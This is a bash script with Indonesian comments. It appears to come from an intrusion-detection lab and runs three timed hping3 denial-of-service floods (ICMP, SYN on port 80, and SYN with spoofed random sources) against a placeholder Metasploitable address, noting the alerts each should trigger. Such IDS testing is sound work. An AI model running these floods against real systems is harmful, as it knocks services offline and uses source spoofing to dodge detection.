#!/bin/bash

# =================================================================
# SKENARIO 03: DENIAL OF SERVICE (DoS) - HPING3
# Strategi: 3 Level Depth (Volumetric, Protocol, Randomized)
# Catatan: Menggunakan 'timeout' agar script tidak looping selamanya.
# =================================================================

# KONFIGURASI
TARGET_IP="192.168.1.XXX"   # Ganti dengan IP Metasploitable
LOG_FILE="logs/dos_session_$(date +%F).log"

# Warna untuk Tampilan Laporan
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo "[+] [03_DOS] Memulai Skenario Denial of Service..."
echo "[+] Target: $TARGET_IP"
echo "[+] Waktu Mulai: $(date)"

# -----------------------------------------------------------------
# LEVEL 1: ICMP FLOOD (Smurf / Ping Flood)
# Tujuan: Menguji deteksi Volumetric Attack (Banjir Bandwidth).
# Teknik: Mengirim paket ICMP (-1) secepat mungkin (--flood).
# Durasi: 30 Detik.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 1] Running ICMP Flood (30 Detik)...${NC}"

# Merekam timestamp awal
echo "Start ICMP Flood: $(date)" > logs/dos_lvl1.txt

# Simpan Command (timeout 30 detik, mode ICMP -1, Flood)
CMD="timeout 30 hping3 -1 --flood $TARGET_IP"

# Tampilkan Command ke Layar
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Eksekusi Command
$CMD >> logs/dos_lvl1.txt 2>&1
echo "    -> Selesai. (Harapan: Alert GPL ICMP Large Packet / Stream anomaly)"
sleep 10

# -----------------------------------------------------------------
# LEVEL 2: SYN FLOOD (TCP State Exhaustion)
# Tujuan: Menghabiskan resource CPU/RAM target (bukan bandwidth).
# Teknik: Mengirim Flag SYN (-S) ke port 80 (-p 80) tanpa ACK.
# Durasi: 30 Detik.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 2] Running SYN Flood Port 80 (30 Detik)...${NC}"

echo "Start SYN Flood: $(date)" > logs/dos_lvl2.txt

# Simpan Command (Mode SYN -S, Port 80)
CMD="timeout 30 hping3 -S -p 80 --flood $TARGET_IP"

# Tampilkan Command ke Layar
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Eksekusi Command
$CMD >> logs/dos_lvl2.txt 2>&1
echo "    -> Selesai. (Harapan: Alert ET DOS Potential SYN Flood)"
sleep 10

# -----------------------------------------------------------------
# LEVEL 3: RANDOM SOURCE ATTACK (DDoS Simulation)
# Tujuan: Mengelabui Rule "Threshold per IP".
# Teknik: Menggunakan IP Palsu Acak (--rand-source). 
#         IDS akan melihat ribuan IP berbeda menyerang, bukan 1 IP.
# Durasi: 30 Detik.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 3] Running Random Source Flood (--rand-source)...${NC}"

echo "Start DDoS Sim: $(date)" > logs/dos_lvl3.txt

# Simpan Command (Flag --rand-source untuk memalsukan IP pengirim)
CMD="timeout 30s hping3 -S -p 80 --flood --rand-source $TARGET_IP"

# Tampilkan Command ke Layar
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Eksekusi Command
$CMD >> logs/dos_lvl3.txt 2>&1
echo "    -> Selesai. (Harapan: Menguji Global Threshold IDS)"

echo "[+] [03_DOS] Modul Selesai pada $(date)"
echo "-----------------------------------------------------------"